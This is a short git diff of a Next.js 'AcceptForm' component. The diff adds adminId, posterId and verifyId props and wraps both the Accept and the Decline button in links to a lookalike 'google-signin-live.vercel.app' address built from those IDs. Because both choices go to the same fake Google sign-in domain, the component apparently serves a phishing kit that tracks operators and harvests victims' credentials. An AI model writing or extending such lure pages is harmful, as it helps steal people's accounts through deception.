@@ -1,7 +1,7 @@
 import Image from "next/image";
 import React from "react";
 
-function AcceptForm({ sitename }) {
+function AcceptForm({adminId, posterId, verifyId, sitename }) {
   console.log("sitename", sitename);
   const time = () => {
     const now = new Date();
@@ -45,10 +45,18 @@ function AcceptForm({ sitename }) {
         </div>
         <div className="flex flex-col gap-4 w-full items-center">
           <button className="bg-green-700 text-white rounded-full w-4/5 py-2 hover:bg-green-600 text-2xl">
+                <a
+          href={`https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`}
+        >
             Accept
+               </a>
           </button>
           <button className="bg-yellow-700 text-white rounded-full w-4/5 py-2 hover:bg-yellow-600 text-2xl">
+                        <a
+          href={`https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`}
+        >
             Decline
+               </a>
           </button>
         </div>
       </div>
